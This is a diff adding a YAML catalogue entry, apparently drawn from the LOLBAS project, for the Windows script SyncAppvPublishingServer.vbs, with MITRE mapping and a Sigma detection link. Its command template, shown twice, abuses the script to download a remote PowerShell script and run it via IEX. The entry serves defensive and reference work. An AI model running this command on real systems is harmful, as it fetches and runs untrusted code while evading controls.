@@ -1,0 +1,92 @@
+id: lolbas/T1NTY3JpcHRzL1N5bmNhcHB2cHVibGlzaGluZ3NlcnZlci55bWw/RXhlY3V0ZQ/0
+type: script
+platform: windows
+name: Syncappvpublishingserver.vbs
+phases:
+- execution
+capabilities:
+- command-execution
+privilege_required: user
+sources:
+- project: LOLBAS
+  upstream_url: https://lolbas-project.github.io
+  license: GPL-3.0
+  upstream_version: 2056cb7662509dc998fc6ce79636aec4e6c0397f
+  last_synced: '2026-11-13'
+attack_techniques:
+- T1216.002
+opsec:
+  noise: high
+  detection_refs:
+  - https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_lolbin_syncappvpublishingserver_vbs_execute_psh.yml
+commands:
+- template: SyncAppvPublishingServer.vbs "n;((New-Object Net.WebClient).DownloadString('{REMOTEURL:.ps1}')
+    | IEX"
+  comment: Inject PowerShell script code with the provided arguments
+references:
+- https://lolbas-project.github.io/lolbas/Scripts/Syncappvpublishingserver/
+tags:
+- windows
+- lolbas
+source_data:
+  LOLBAS:
+    raw:
+      name: Syncappvpublishingserver.vbs
+      category: Execute
+      privileges: User
+      mitre_id: T1216.002
+      source_file: OSScripts/Syncappvpublishingserver.yml
+      command_source_index: 0
+      document_utf8: "---\nName: Syncappvpublishingserver.vbs\nDescription: Script used related to app-v\
+        \ and publishing server\nAuthor: Oddvar Moe\nCreated: 2018-05-25\nCommands:\n  - Command: SyncAppvPublishingServer.vbs\
+        \ \"n;((New-Object Net.WebClient).DownloadString('{REMOTEURL:.ps1}') | IEX\"\n    Description:\
+        \ Inject PowerShell script code with the provided arguments\n    Usecase: Use Powershell host\
+        \ invoked from vbs script\n    Category: Execute\n    Privileges: User\n    MitreID: T1216.002\n\
+        \    OperatingSystem: Windows 10, Windows 11\n    Tags:\n      - Execute: PowerShell\nFull_Path:\n\
+        \  - Path: C:\\Windows\\System32\\SyncAppvPublishingServer.vbs\nDetection:\n  - Sigma: https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_lolbin_syncappvpublishingserver_vbs_execute_psh.yml\n\
+        Resources:\n  - Link: https://twitter.com/monoxgas/status/895045566090010624\n  - Link: https://twitter.com/subTee/status/855738126882316288\n\
+        Acknowledgement:\n  - Person: Nick Landers\n    Handle: '@monoxgas'\n  - Person: Casey Smith\n\
+        \    Handle: '@subtee'\n"
+      document_sha256: sha256:00668524f3bf754da7150ba07c3214e73827f88fd3d26cd95406aa954f9173cb
+    upstream_url: https://lolbas-project.github.io/lolbas/Scripts/Syncappvpublishingserver/
+    upstream_version: 2056cb7662509dc998fc6ce79636aec4e6c0397f
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: command-execution
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  phases:
+  - value: execution
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  attack_techniques:
+  - value: T1216.002
+    provenance:
+      type: upstream
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  privilege_required:
+    value: user
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    LOLBAS: sha256:89f920d520861db92e260577c2ef93b9258e8c5a2cf1a9c4fdfc0c45ed6e5b5a
